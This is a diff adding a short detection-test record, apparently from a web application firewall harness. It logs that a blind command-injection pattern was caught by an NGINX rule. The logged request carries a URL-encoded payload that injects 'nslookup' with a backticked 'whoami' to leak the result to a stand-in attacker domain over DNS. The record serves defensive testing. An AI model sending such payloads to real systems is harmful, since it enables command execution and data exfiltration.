@@ -1,0 +1,5 @@
+Pattern ID: CMD_BLIND_004
+        Status: passed
+        Latency: ~80000ms
+        Detection: 1 / 1
+        Rule: [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_004-1772268909628-slcjic pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1
